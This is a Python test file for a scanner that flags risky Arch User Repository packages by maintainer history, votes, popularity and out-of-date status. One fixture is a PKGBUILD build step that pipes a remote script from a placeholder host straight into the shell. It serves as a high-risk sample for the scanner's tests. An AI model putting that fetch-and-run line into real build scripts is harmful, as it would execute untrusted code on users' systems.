"""Per-rule tests for M01-M04."""

from __future__ import annotations

from datetime import timedelta

from aurscan.history import Commit, maintainer_change_findings
from aurscan.models import Severity
from tests.rules_utils import NOW, by_rule, make_meta, run_rules

HIGH_RISK = """\
build() {
  curl -s https://example.invalid/x.sh | sh
}
"""


def _commit(author: str, hash_char: str) -> Commit:
    return Commit(
        hash=hash_char * 40,
        author=author,
        tree_files=["PKGBUILD"],
    )


def test_m01_fires_for_orphan_with_author_change() -> None:
    commits = [_commit("Bob", "b"), _commit("Alice", "a")]

    findings = maintainer_change_findings(commits, make_meta(maintainer=None))

    assert [item.rule_id for item in findings] == ["M01"]
    assert findings[0].severity == Severity.MEDIUM
    assert findings[0].source == "history"


def test_m01_ignores_maintained_packages_and_single_author() -> None:
    changed = [_commit("Bob", "b"), _commit("Alice", "a")]
    same_author = [_commit("Alice", "b"), _commit("Alice", "a")]

    assert maintainer_change_findings(changed, make_meta(maintainer="Bob")) == []
    assert maintainer_change_findings(same_author, make_meta(maintainer=None)) == []


def test_m02_flags_new_packages_without_votes() -> None:
    meta = make_meta(first_submitted=NOW - timedelta(days=10), num_votes=0)
    findings = by_rule(run_rules(meta=meta), "M02")

    assert len(findings) == 1
    assert findings[0].severity == Severity.LOW
    assert findings[0].source == "metadata"


def test_m02_ignores_old_or_voted_packages() -> None:
    old = make_meta(first_submitted=NOW - timedelta(days=40), num_votes=0)
    voted = make_meta(first_submitted=NOW - timedelta(days=10), num_votes=3)

    assert by_rule(run_rules(meta=old), "M02") == []
    assert by_rule(run_rules(meta=voted), "M02") == []


def test_m03_flags_out_of_date_packages() -> None:
    meta = make_meta(out_of_date=NOW - timedelta(days=3))
    findings = by_rule(run_rules(meta=meta), "M03")

    assert len(findings) == 1
    assert findings[0].severity == Severity.LOW


def test_m03_ignores_current_packages() -> None:
    assert by_rule(run_rules(meta=make_meta()), "M03") == []


def test_m04_requires_no_votes_no_popularity_and_a_high_finding() -> None:
    meta = make_meta(num_votes=0, popularity=0.0)
    findings = by_rule(run_rules(HIGH_RISK, meta=meta), "M04")

    assert len(findings) == 1
    assert findings[0].severity == Severity.LOW


def test_m04_ignores_popular_packages_and_packages_without_high_findings() -> None:
    popular = make_meta(num_votes=0, popularity=0.5)
    quiet = make_meta(num_votes=0, popularity=0.0)

    assert by_rule(run_rules(HIGH_RISK, meta=popular), "M04") == []
    assert by_rule(run_rules("build() {\n  make\n}\n", meta=quiet), "M04") == []
